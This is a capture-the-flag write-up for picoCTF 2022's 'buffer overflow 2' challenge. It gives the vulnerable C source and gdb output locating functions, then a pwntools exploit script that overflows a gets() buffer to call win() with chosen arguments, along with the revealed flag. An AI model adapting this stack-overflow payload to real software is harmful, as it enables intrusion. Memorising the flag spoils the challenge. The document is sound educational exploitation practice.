#pico2022 #binaryexploitation 

## Challenge:
```md
Control the return address and arguments
```

This challenge launches an instance.
```md
Control the return address and arguments This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/344/vuln)? You can view source [here](https://artifacts.picoctf.net/c/344/vuln.c). And connect with it using `nc saturn.picoctf.net 60541`
```

## Process:
Download the files.
```bash
curl -O https://artifacts.picoctf.net/c/344/vuln
curl -O https://artifacts.picoctf.net/c/344/vuln.c
```
#curl 

Looking at the source.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
#c 

Here I see the *win()* function and that it needs 2 arguments *0xCAFEF00D* and *0xF00DF00D*.
```c
...
  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
...
```

Run *gdb* and find the overflow offset as well as find the *win()*  and *main()* functions.
```bash
gdb vuln
```
#gdb 

```
gdb-peda$ info function main
All functions matching regular expression "main":

Non-debugging symbols:
0x08049140  __libc_start_main@plt
0x08049372  main

gdb-peda$ info function win
All functions matching regular expression "win":

Non-debugging symbols:
0x08049296  win
```

```
gdb-peda$ run
Starting program: /home/jacob/docs/ctf/pico/2022/042_buffer_overflow_2/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
```

![[042_buffer_overflow_2.png]]


I wrote a script to send the payload.
```python
#!/usr/bin/env python3

from pwn import *

connect = remote("saturn.picoctf.net", 60541)
log.info("Starting buffer overflow")
connect.recvuntil(b":")
log.info("Creating payload")
payload = b"A" * 112
payload += p32(0x8049296) # win function address
payload += p32(0x8049372) # main function address
payload += p32(0xCAFEF00D) # arg1
payload += p32(0xF00DF00D) # arg2
log.info("Sending payload to the server")
connect.sendline(payload)
connect.recv()
connect.interactive()
```

Run the exploit.
```bash
python exploit.py
```
#python 

```
[+] Opening connection to saturn.picoctf.net on port 62483: Done
[*] Starting buffer overflow
[*] Creating payload
[*] Sending payload to the server
[*] Switching to interactive mode
\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04r\x93\x04
picoCTF{argum3nt5_4_d4yZ_b3fd8f66}Please enter your string:
```

And this gave me the flag.
```bash
echo "picoCTF{argum3nt5_4_d4yZ_b3fd8f66}" > flag.txt
```

**Flag: *picoCTF{argum3nt5_4_d4yZ_b3fd8f66}***
